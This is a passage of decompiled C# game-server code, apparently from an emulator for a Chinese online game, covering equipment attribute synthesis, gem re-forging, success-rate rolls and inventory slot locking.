									MainForm.WriteLine(6, "合成系统 WGF BUG1[" + BitConverter.ToInt32(hcItimesClass169.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass170.物品id, 0) + "]");
									break;
								}
								goto IL_3a80;
							}
							if (value74.FLD_RESIDE2 == 1 || value74.FLD_RESIDE2 == 2 || value74.FLD_RESIDE2 == 5 || ((value74.FLD_RESIDE2 == 6) ? true : false))
							{
								int num7 = BitConverter.ToInt32(hcItimesClass170.物品id, 0);
								switch (num7)
								{
								default:
									合成提示(21, 5, 0, 装备栏包裹[hcItimesClass169.位置]);
									合成物品表.Clear();
									MainForm.WriteLine(6, "合成系统 WGF BUG2[" + BitConverter.ToInt32(hcItimesClass169.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass170.物品id, 0) + "]");
									return;
								case 800000002:
								case 800000024:
								case 800000062:
								case 800000076:
								case 1000001651:
									break;
								}
								if (value74.FLD_LEVEL >= 160)
								{
									if (num7 != 1000001651)
									{
										合成提示(num, 5, 0, 装备栏包裹[num30]);
										return;
									}
								}
								else if (value74.FLD_LEVEL >= 130 && value74.FLD_LEVEL < 160)
								{
									if (1 == 0)
									{
									}
									bool flag8 = num7 switch
									{
										800000076 => false, 
										800000062 => false, 
										_ => true, 
									};
									if (1 == 0)
									{
									}
									if (flag8)
									{
										合成提示(num, 5, 0, 装备栏包裹[num30]);
										return;
									}
								}
								else if (value74.FLD_LEVEL >= 80 && ((value74.FLD_LEVEL < 130) ? true : false))
								{
									if (1 == 0)
									{
									}
									bool flag8 = num7 switch
									{
										800000024 => false, 
										800000002 => false, 
										_ => true, 
									};
									if (1 == 0)
									{
									}
									if (flag8)
									{
										合成提示(num, 5, 0, 装备栏包裹[num30]);
										return;
									}
								}
								else if (num7 != 800000002)
								{
									合成提示(num, 5, 0, 装备栏包裹[num30]);
									return;
								}
								if (value74.FLD_RESIDE2 == 6 && (hcItimesClass169.属性2.属性数量 != 0 || hcItimesClass169.属性3.属性数量 != 0 || ((hcItimesClass169.属性4.属性数量 != 0) ? true : false)))
								{
									return;
								}
								goto IL_3a80;
							}
							if (value74.FLD_RESIDE2 == 4)
							{
								int num8 = BitConverter.ToInt32(hcItimesClass170.物品id, 0);
								switch (num8)
								{
								default:
									合成提示(21, 5, 0, 装备栏包裹[hcItimesClass169.位置]);
									合成物品表.Clear();
									MainForm.WriteLine(6, "合成系统 WGF BUG3[" + BitConverter.ToInt32(hcItimesClass169.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass170.物品id, 0) + "]");
									return;
								case 800000001:
								case 800000023:
								case 800000061:
								case 800000071:
								case 1000001650:
									break;
								}
								if (value74.FLD_LEVEL >= 160)
								{
									if (num8 != 1000001650)
									{
										合成提示(num, 5, 0, 装备栏包裹[num30]);
										return;
									}
								}
								else if (value74.FLD_LEVEL >= 130 && value74.FLD_LEVEL < 160)
								{
									if (1 == 0)
									{
									}
									bool flag8 = num8 switch
									{
										800000071 => false, 
										800000061 => false, 
										_ => true, 
									};
									if (1 == 0)
									{
									}
									if (flag8)
									{
										合成提示(num, 5, 0, 装备栏包裹[num30]);
										return;
									}
								}
								else if (value74.FLD_LEVEL >= 80 && ((value74.FLD_LEVEL < 130) ? true : false))
								{
									if (1 == 0)
									{
									}
									bool flag8 = num8 switch
									{
										800000023 => false, 
										800000001 => false, 
										_ => true, 
									};
									if (1 == 0)
									{
									}
									if (flag8)
									{
										合成提示(num, 5, 0, 装备栏包裹[num30]);
										return;
									}
								}
								else if (num8 != 800000001)
								{
									合成提示(num, 5, 0, 装备栏包裹[num30]);
									return;
								}
								goto IL_3a80;
							}
							合成提示(21, 5, 0, 装备栏包裹[hcItimesClass169.位置]);
							合成物品表.Clear();
						}
						else
						{
							合成提示(21, 5, 0, 装备栏包裹[hcItimesClass169.位置]);
							合成物品表.Clear();
						}
						goto end_IL_2c5f;
						IL_34be:
						double num9 = RNG.Next(0, 120);
						bool flag7 = false;
						double num10 = hcItimesClass169.属性1.数量 * 20 + hcItimesClass169.属性2.数量 * 20 + hcItimesClass169.属性3.数量 * 20 + hcItimesClass169.属性4.数量 * 20;
						if (hcItimesClass169.属性1.属性数量 != 0 && hcItimesClass169.属性2.属性数量 != 0 && hcItimesClass169.属性3.属性数量 != 0 && ((hcItimesClass169.属性4.属性数量 != 0) ? true : false))
						{
							合成提示(21, 3, 0, 装备栏包裹[hcItimesClass169.位置]);
							合成物品表.Clear();
							break;
						}
						if (hcItimesClass171 != null)
						{
							num9 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass171.物品id, 0));
						}
						if (元宝合成开关 == 1)
						{
							num9 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num9 += 100.0 * World.VIP合成率增加百分比;
						}
						if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
						{
							num9 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num9 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						if (hcItimesClass169.属性1.属性数量 == 0)
						{
							if (num9 >= num10 - World.属性一合成率)
							{
								flag7 = true;
							}
						}
						else if (hcItimesClass169.属性2.属性数量 == 0)
						{
							if (num9 >= num10 - World.属性二合成率)
							{
								flag7 = true;
							}
						}
						else if (hcItimesClass169.属性3.属性数量 == 0)
						{
							if (num9 >= num10 - World.属性三合成率)
							{
								flag7 = true;
							}
						}
						else if (hcItimesClass169.属性4.属性数量 == 0 && num9 >= num10 - World.属性四合成率)
						{
							flag7 = true;
						}
						if (flag7)
						{
							if (hcItimesClass169.属性1.属性类型 == 0)
							{
								if (hcItimesClass170.阶段类型 == 8)
								{
									hcItimesClass169.属性1.气功属性类型 = hcItimesClass170.气功属性类型;
								}
								hcItimesClass169.属性1.属性类型 = hcItimesClass170.阶段类型;
								hcItimesClass169.属性1.属性数量 = hcItimesClass170.阶段数量;
								hcItimesClass169.设置属性();
							}
							else if (hcItimesClass169.属性2.属性类型 == 0)
							{
								if (hcItimesClass170.阶段类型 == 8)
								{
									hcItimesClass169.属性2.气功属性类型 = hcItimesClass170.气功属性类型;
								}
								hcItimesClass169.属性2.属性类型 = hcItimesClass170.阶段类型;
								hcItimesClass169.属性2.属性数量 = hcItimesClass170.阶段数量;
								hcItimesClass169.设置属性();
							}
							else if (hcItimesClass169.属性3.属性类型 == 0)
							{
								if (hcItimesClass170.阶段类型 == 8)
								{
									hcItimesClass169.属性3.气功属性类型 = hcItimesClass170.气功属性类型;
								}
								hcItimesClass169.属性3.属性类型 = hcItimesClass170.阶段类型;
								hcItimesClass169.属性3.属性数量 = hcItimesClass170.阶段数量;
								hcItimesClass169.设置属性();
							}
							else if (hcItimesClass169.属性4.属性类型 == 0)
							{
								if (hcItimesClass170.阶段类型 == 8)
								{
									hcItimesClass169.属性4.气功属性类型 = hcItimesClass170.气功属性类型;
								}
								hcItimesClass169.属性4.属性类型 = hcItimesClass170.阶段类型;
								hcItimesClass169.属性4.属性数量 = hcItimesClass170.阶段数量;
								hcItimesClass169.设置属性();
							}
							RxjhClass.合成记录(base.Userid, base.UserName, value74.ItmeNAME, num, "合成", "成功", 装备栏包裹[hcItimesClass169.位置]);
							合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass169.位置]);
						}
						else
						{
							RxjhClass.合成记录(base.Userid, base.UserName, value74.ItmeNAME, num, "合成", "失败", 装备栏包裹[hcItimesClass169.位置]);
							合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass169.位置]);
						}
						减去物品(hcItimesClass170.位置, 1);
						if (hcItimesClass171 != null)
						{
							减去物品(hcItimesClass171.位置, 1);
						}
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass169.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass169.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass169.物品全局ID, 0)) ? true : false))
						{
							减去物品(hcItimesClass169.位置, 1);
							增加物品(hcItimesClass169.物品全局ID, hcItimesClass169.物品id, hcItimesClass169.位置, hcItimesClass169.物品数量, hcItimesClass169.物品属性);
						}
						装备栏包裹[hcItimesClass169.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						合成手续费 = 0;
						goto end_IL_2c5f;
						IL_3a80:
						if (hcItimesClass169.强化数量 > 0)
						{
							合成提示(21, 3, 0, 装备栏包裹[hcItimesClass169.位置]);
							合成物品表.Clear();
							break;
						}
						if (合成手续费 <= 0)
						{
							goto IL_34be;
						}
						if (base.Player_Money < 合成手续费)
						{
							合成提示(11, 4, 0, 装备栏包裹[hcItimesClass169.位置]);
							合成物品表.Clear();
							break;
						}
						base.Player_Money -= 合成手续费;
						更新金钱和负重();
						goto IL_34be;
						end_IL_2c5f:;
					}
					catch (Exception ex11)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex11.Message);
					}
					break;
				case 21:
					try
					{
						if (base.当前操作类型 != 6)
						{
							break;
						}
						ItmeClass value168;
						if (装备栏包裹[num30].锁定)
						{
							合成提示(num, 3, 0, 装备栏包裹[num30]);
						}
						else if (装备栏包裹[num30].物品绑定 || ((装备栏包裹[num30].FLD_强化数量 > 0) ? true : false))
						{
							合成提示(num, 3, 0, 装备栏包裹[num30]);
						}
						else if (装备栏包裹[num30].FLD_MAGIC1 != 0 && 装备栏包裹[num30].FLD_MAGIC2 != 0 && 装备栏包裹[num30].FLD_MAGIC3 != 0 && ((装备栏包裹[num30].FLD_MAGIC4 != 0) ? true : false))
						{
							合成提示(num, 3, 0, 装备栏包裹[num30]);
						}
						else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value168))
						{
							if (value168.FLD_RESIDE2 != 1 && value168.FLD_RESIDE2 != 2 && value168.FLD_RESIDE2 != 4 && value168.FLD_RESIDE2 != 5 && value168.FLD_RESIDE2 != 6 && ((value168.FLD_RESIDE2 != 12) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (!合成物品表.ContainsKey(1))
							{
								int 钱数2 = (合成手续费 = 计算合成强化费用(value168, num30, num));
								HcItimesClass hcItimesClass28 = new HcItimesClass();
								hcItimesClass28.位置 = num30;
								hcItimesClass28.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value169 = hcItimesClass28;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(1, value169);
								合成提示(num, 1, 钱数2, 装备栏包裹[num30]);
							}
						}
						else
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex79)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex79.Message);
					}
					break;
				case 22:
					try
					{
						if (base.当前操作类型 != 6)
						{
							break;
						}
						if (合成物品表 == null || 合成物品表.Count == 0 || ((!合成物品表.ContainsKey(1)) ? true : false))
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							break;
						}
						HcItimesClass hcItimesClass152 = 合成物品表[1];
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass152.物品id, 0), out var value49) || (合成物品表.ContainsKey(2) ? true : false))
						{
							break;
						}
						if (value49.FLD_RESIDE2 == 1 || value49.FLD_RESIDE2 == 2 || value49.FLD_RESIDE2 == 5 || ((value49.FLD_RESIDE2 == 6) ? true : false))
						{
							if (装备栏包裹[num30].Get物品ID != 1000001651 && 装备栏包裹[num30].Get物品ID != 800000076 && 装备栏包裹[num30].Get物品ID != 800000062 && 装备栏包裹[num30].Get物品ID != 800000024 && ((装备栏包裹[num30].Get物品ID != 800000002) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value49.FLD_LEVEL >= 160)
							{
								if (装备栏包裹[num30].Get物品ID == 1000001651)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value49.FLD_LEVEL >= 130 && value49.FLD_NJ >= 1000 && value49.FLD_LEVEL < 160)
							{
								if (装备栏包裹[num30].Get物品ID == 800000062 || 装备栏包裹[num30].Get物品ID == 800000076)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value49.FLD_LEVEL >= 130 && value49.FLD_NJ == 0 && value49.FLD_LEVEL < 160)
							{
								if (装备栏包裹[num30].Get物品ID == 800000062)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value49.FLD_LEVEL >= 80 && ((value49.FLD_LEVEL < 130) ? true : false))
							{
								if (装备栏包裹[num30].Get物品ID == 800000002 || 装备栏包裹[num30].Get物品ID == 800000024)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else
							{
								if (装备栏包裹[num30].Get物品ID == 800000002)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
						}
						else if (value49.FLD_RESIDE2 == 4)
						{
							if (装备栏包裹[num30].Get物品ID != 1000001650 && 装备栏包裹[num30].Get物品ID != 800000071 && 装备栏包裹[num30].Get物品ID != 800000061 && 装备栏包裹[num30].Get物品ID != 800000023 && ((装备栏包裹[num30].Get物品ID != 800000001) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value49.FLD_LEVEL < 80)
							{
								if (装备栏包裹[num30].Get物品ID == 800000001)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value49.FLD_LEVEL >= 80 && ((value49.FLD_LEVEL < 130) ? true : false))
							{
								if (装备栏包裹[num30].Get物品ID == 800000001 || 装备栏包裹[num30].Get物品ID == 800000023)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value49.FLD_LEVEL >= 130 && value49.FLD_NJ >= 1000 && value49.FLD_LEVEL < 160)
							{
								if (装备栏包裹[num30].Get物品ID == 800000061 || 装备栏包裹[num30].Get物品ID == 800000071)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (value49.FLD_LEVEL >= 130 && value49.FLD_NJ == 0 && value49.FLD_LEVEL < 160)
							{
								if (装备栏包裹[num30].Get物品ID == 800000061)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else
							{
								if (value49.FLD_LEVEL < 160 || 装备栏包裹[num30].Get物品ID == 1000001650)
								{
									goto IL_4657;
								}
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
						}
						else if (value49.FLD_RESIDE2 == 12)
						{
							if (装备栏包裹[num30].Get物品ID == 800000013)
							{
								goto IL_4657;
							}
							合成提示(21, 5, 0, 装备栏包裹[hcItimesClass152.位置]);
						}
						else
						{
							合成提示(21, 5, 0, 装备栏包裹[hcItimesClass152.位置]);
						}
						goto end_IL_3ea1;
						IL_4657:
						合成物品表.TryAdd(2, new HcItimesClass
						{
							位置 = num30,
							物品 = 装备栏包裹[num30].物品_byte
						});
						装备栏包裹[num30].锁定 = true;
						合成提示(num, 1, 0, 装备栏包裹[num30]);
						end_IL_3ea1:;
					}
					catch (Exception ex118)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex118.Message);
					}
					break;
				case 23:
					try
					{
						if (base.当前操作类型 == 6)
						{
							if (合成物品表 == null || 合成物品表.Count == 0 || ((!合成物品表.ContainsKey(1)) ? true : false))
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (!合成物品表.ContainsKey(3))
							{
								合成物品表.TryAdd(3, new HcItimesClass
								{
									位置 = num30,
									物品 = 装备栏包裹[num30].物品_byte
								});
								装备栏包裹[num30].锁定 = true;
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex51)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex51.Message);
					}
					break;
				case 29:
					try
					{
						if (合成物品表.TryGetValue(1, out var value138))
						{
							装备栏包裹[value138.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value138.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
					}
					catch (Exception ex57)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex57.Message);
					}
					break;
				case 30:
					try
					{
						if (base.当前操作类型 != 14)
						{
							break;
						}
						if (合成物品表 == null || ((合成物品表.Count != 4) ? true : false))
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							系统提示("石头放少了, 再造合成石最少需要4颗同类型的石头。");
						}
						else
						{
							if (合成物品表[1] == null || 合成物品表[2] == null || 合成物品表[3] == null || ((合成物品表[4] == null) ? true : false))
							{
								break;
							}
							CheckTreasureGems();
							if (World.每次再造消耗设置 == 0)
							{
								if (base.Player_Money >= World.每次消耗的数量)
								{
									base.Player_Money -= World.每次消耗的数量;
									更新金钱和负重();
									goto IL_4af2;
								}
								合成提示(num, 4, 0, 装备栏包裹[num30]);
								break;
							}
							if (base.FLD_RXPIONT >= World.每次消耗的数量)
							{
								检察元宝数据(World.每次消耗的数量, 0, "合成");
								RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "再造合成石消耗", 1, World.每次消耗的数量);
								SaveGemData();
								goto IL_4af2;
							}
							合成提示(num, 4, 0, 装备栏包裹[num30]);
							系统提示("元宝不足, 再造合成石需要扣除" + World.每次消耗的数量 + "元宝/次。");
							break;
						}
						goto end_IL_491b;
						IL_4af2:
						int num132 = RNG.Next(0, 200);
						int num133 = RNG.Next(0, 120);
						string text = "3";
						int num134 = 0;
						int value50 = 0;
						int num135 = BitConverter.ToInt32(合成物品表[1].物品id, 0);
						HcItimesClass hcItimesClass154 = 合成物品表[1];
						HcItimesClass hcItimesClass155 = 合成物品表[2];
						HcItimesClass hcItimesClass156 = 合成物品表[3];
						HcItimesClass hcItimesClass157 = 合成物品表[4];
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass154.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass154.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass155.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass155.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass156.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass156.物品全局ID, 0) || ((BitConverter.ToInt64(装备栏包裹[hcItimesClass157.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass157.物品全局ID, 0)) ? true : false))
						{
							break;
						}
						if (base.FLD_VIP == 1)
						{
							num132 += 40;
							num133 += 20;
						}
						int value51;
						switch (num135)
						{
						default:
							return;
						case 800000001:
							value51 = 800000001;
							if (num132 >= 0 && ((num132 <= 40) ? true : false))
							{
								text = "3";
							}
							else if (num132 > 40 && ((num132 <= 80) ? true : false))
							{
								text = "5";
							}
							else if (num132 > 80 && ((num132 <= 120) ? true : false))
							{
								text = "10";
							}
							else if (num132 > 120 && ((num132 <= 160) ? true : false))
							{
								text = "1";
							}
							else if (num132 > 160 && ((num132 <= 200) ? true : false))
							{
								text = "1";
							}
							else if (num132 > 200 && ((num132 <= 240) ? true : false))
							{
								text = "7";
							}
							switch (text)
							{
							case "10":
							{
								string[] array26 = World.再造金刚石追伤.Split(';');
								num134 = RNG.Next(int.Parse(array26[0]), int.Parse(array26[1]));
								break;
							}
							case "7":
							{
								string[] array25 = World.再造金刚石武功.Split(';');
								num134 = RNG.Next(int.Parse(array25[0]), int.Parse(array25[1]));
								break;
							}
							case "5":
							{
								string[] array24 = World.再造金刚石命中.Split(';');
								num134 = RNG.Next(int.Parse(array24[0]), int.Parse(array24[1]));
								break;
							}
							case "3":
							{
								string[] array22 = World.再造金刚石生命.Split(';');
								num134 = RNG.Next(int.Parse(array22[0]), int.Parse(array22[1]));
								break;
							}
							case "1":
							{
								string[] array21 = World.再造金刚石攻击.Split(';');
								num134 = RNG.Next(int.Parse(array21[0]), int.Parse(array21[1]));
								break;
							}
							}
							if (num133 > 0 && ((num133 <= 40) ? true : false))
							{
								value51 = 800000001;
							}
							else if (num133 > 40 && ((num133 <= 80) ? true : false))
							{
								value51 = 800000023;
							}
							else if (num133 > 80 && ((num133 <= 135) ? true : false))
							{
								value51 = 800000061;
							}
							break;
						case 800000002:
							value51 = 800000002;
							if (num132 >= 0 && ((num132 <= 40) ? true : false))
							{
								text = "3";
							}
							else if (num132 > 40 && ((num132 <= 80) ? true : false))
							{
								text = "4";
							}
							else if (num132 > 80 && ((num132 <= 120) ? true : false))
							{
								text = "6";
							}
							else if (num132 > 120 && ((num132 <= 160) ? true : false))
							{
								text = "2";
							}
							else if (num132 > 160 && ((num132 <= 200) ? true : false))
							{
								text = "2";
							}
							else if (num132 > 200 && ((num132 <= 240) ? true : false))
							{
								text = "11";
							}
							switch (text)
							{
							case "11":
							{
								string[] array20 = World.再造寒玉石武防.Split(';');
								num134 = RNG.Next(int.Parse(array20[0]), int.Parse(array20[1]));
								break;
							}
							case "6":
							{
								string[] array19 = World.再造寒玉石回避.Split(';');
								num134 = RNG.Next(int.Parse(array19[0]), int.Parse(array19[1]));
								break;
							}
							case "4":
							{
								string[] array18 = World.再造寒玉石内功.Split(';');
								num134 = RNG.Next(int.Parse(array18[0]), int.Parse(array18[1]));
								break;
							}
							case "3":
							{
								string[] array17 = World.再造寒玉石生命.Split(';');
								num134 = RNG.Next(int.Parse(array17[0]), int.Parse(array17[1]));
								break;
							}
							case "2":
							{
								string[] array16 = World.再造寒玉石防御.Split(';');
								num134 = RNG.Next(int.Parse(array16[0]), int.Parse(array16[1]));
								break;
							}
							}
							if (num133 > 0 && ((num133 <= 40) ? true : false))
							{
								value51 = 800000002;
							}
							else if (num133 > 40 && ((num133 <= 80) ? true : false))
							{
								value51 = 800000024;
							}
							else if (num133 > 80 && ((num133 <= 135) ? true : false))
							{
								value51 = 800000062;
							}
							break;
						}
						switch (num134.ToString().Length)
						{
						case 1:
							value50 = int.Parse(text + "0000" + num134);
							break;
						case 2:
							value50 = int.Parse(text + "000" + num134);
							break;
						case 3:
							value50 = int.Parse(text + "00" + num134);
							break;
						case 4:
							value50 = int.Parse(text + "0" + num134);
							break;
						case 5:
							value50 = int.Parse(text + num134);
							break;
						}
						减去物品(hcItimesClass154.位置, 1);
						减去物品(hcItimesClass155.位置, 1);
						减去物品(hcItimesClass156.位置, 1);
						减去物品(hcItimesClass157.位置, 1);
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value51), hcItimesClass154.位置, BitConverter.GetBytes(1), BitConverter.GetBytes(value50));
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						合成提示(num, 1, 0, 装备栏包裹[num30]);
						end_IL_491b:;
					}
					catch (Exception ex119)
					{
						MainForm.WriteLine(1, "合成系统 再造合成石-确认再造 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex119.Message);
					}
					break;
				case 32:
					try
					{
						if (base.当前操作类型 != 14 || (装备栏包裹[num30].Get物品ID != 800000001 && 装备栏包裹[num30].Get物品ID != 800000002) || ((合成物品表.Count >= 4) ? true : false))
						{
							break;
						}
						if (!合成物品表.ContainsKey(1))
						{
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
						else if (!合成物品表.ContainsKey(2))
						{
							HcItimesClass value85 = new HcItimesClass();
							if (合成物品表.TryGetValue(1, out value85))
							{
								if (装备栏包裹[num30].Get物品ID == BitConverter.ToInt32(value85.物品id, 0))
								{
									装备栏包裹[num30].锁定 = true;
									合成物品表.TryAdd(2, new HcItimesClass
									{
										位置 = num30,
										物品 = 装备栏包裹[num30].物品_byte
									});
									合成提示(num, 1, 0, 装备栏包裹[num30]);
								}
								else
								{
									合成提示(num, 9, 0, 装备栏包裹[num30]);
								}
							}
						}
						else if (!合成物品表.ContainsKey(3))
						{
							HcItimesClass value86 = new HcItimesClass();
							if (合成物品表.TryGetValue(1, out value86))
							{
								if (装备栏包裹[num30].Get物品ID == BitConverter.ToInt32(value86.物品id, 0))
								{
									装备栏包裹[num30].锁定 = true;
									合成物品表.TryAdd(3, new HcItimesClass
									{
										位置 = num30,
										物品 = 装备栏包裹[num30].物品_byte
									});
									合成提示(num, 1, 0, 装备栏包裹[num30]);
								}
								else
								{
									合成提示(num, 9, 0, 装备栏包裹[num30]);
								}
							}
						}
						else
						{
							if (合成物品表.ContainsKey(4))
							{
								break;
							}
							HcItimesClass value87 = new HcItimesClass();
							if (合成物品表.TryGetValue(1, out value87))
							{
								if (装备栏包裹[num30].Get物品ID == BitConverter.ToInt32(value87.物品id, 0))
								{
									装备栏包裹[num30].锁定 = true;
									合成物品表.TryAdd(4, new HcItimesClass
									{
										位置 = num30,
										物品 = 装备栏包裹[num30].物品_byte
									});
									合成提示(num, 1, 0, 装备栏包裹[num30]);
								}
								else
								{
									合成提示(num, 9, 0, 装备栏包裹[num30]);
								}
							}
							break;
						}
					}
					catch (Exception ex18)
					{
						MainForm.WriteLine(1, "合成系统 再造合成石-放合成石 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex18.Message);
					}
					break;
				case 39:
					try
					{
						if (合成物品表.TryGetValue(1, out var value165))
						{
							装备栏包裹[value165.位置].锁定 = false;
						}
						if (合成物品表.TryGetValue(2, out value165))
						{
							装备栏包裹[value165.位置].锁定 = false;
						}
						if (合成物品表.TryGetValue(3, out value165))
						{
							装备栏包裹[value165.位置].锁定 = false;
						}
						if (合成物品表.TryGetValue(4, out value165))
						{
							装备栏包裹[value165.位置].锁定 = false;
						}
						元宝合成开关 = 0;
						合成物品表.Clear();
						合成系统解锁();
						合成提示(num, 1, 0, 装备栏包裹[value165.位置]);
					}
					catch (Exception ex98)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 再造合成石-取消 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex98.Message);
					}
					break;
				case 40:
					try
					{
						if (base.当前操作类型 != 101)
						{
							break;
						}
						byte[] array5 = new byte[4];
						byte[] dst = new byte[4];
						Buffer.BlockCopy(封包数据, 14, array5, 0, 4);
						Buffer.BlockCopy(封包数据, 18, dst, 0, 4);
						int num61 = BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array5, 0)].物品ID, 0);
						if (num61 == 0 || ((合成物品表.Count <= 0) ? true : false))
						{
							break;
						}
						HcItimesClass hcItimesClass97 = null;
						HcItimesClass hcItimesClass99 = null;
						HcItimesClass hcItimesClass100 = null;
						HcItimesClass hcItimesClass101 = null;
						HcItimesClass hcItimesClass102 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass97 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass99 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass100 = 合成物品表[3];
						}
						if (合成物品表.ContainsKey(4))
						{
							hcItimesClass101 = 合成物品表[4];
						}
						if (合成物品表.ContainsKey(5))
						{
							hcItimesClass102 = 合成物品表[5];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
							合成物品表.Clear();
						}
						else
						{
							if (hcItimesClass99 == null)
							{
								break;
							}
							if (hcItimesClass99 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass99.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass99.物品全局ID, 0))
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass99.位置]);
								合成物品表.Clear();
								break;
							}
							if (hcItimesClass100 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass100.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass100.物品全局ID, 0))
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass100.位置]);
								合成物品表.Clear();
								break;
							}
							if (hcItimesClass101 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass101.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass101.物品全局ID, 0))
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass101.位置]);
								合成物品表.Clear();
								break;
							}
							if (hcItimesClass102 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass102.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass102.物品全局ID, 0))
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass102.位置]);
								合成物品表.Clear();
								break;
							}
							hcItimesClass97.得到属性();
							hcItimesClass97.强化属性阶段();
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass97.物品id, 0), out var value139))
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
								合成物品表.Clear();
								break;
							}
							if (value139.FLD_RESIDE2 != 1 && value139.FLD_RESIDE2 != 2 && value139.FLD_RESIDE2 != 4 && value139.FLD_RESIDE2 != 5 && value139.FLD_RESIDE2 != 6 && value139.FLD_RESIDE2 != 14 && value139.FLD_RESIDE2 != 23 && value139.FLD_RESIDE2 != 24 && value139.FLD_RESIDE2 != 25)
							{
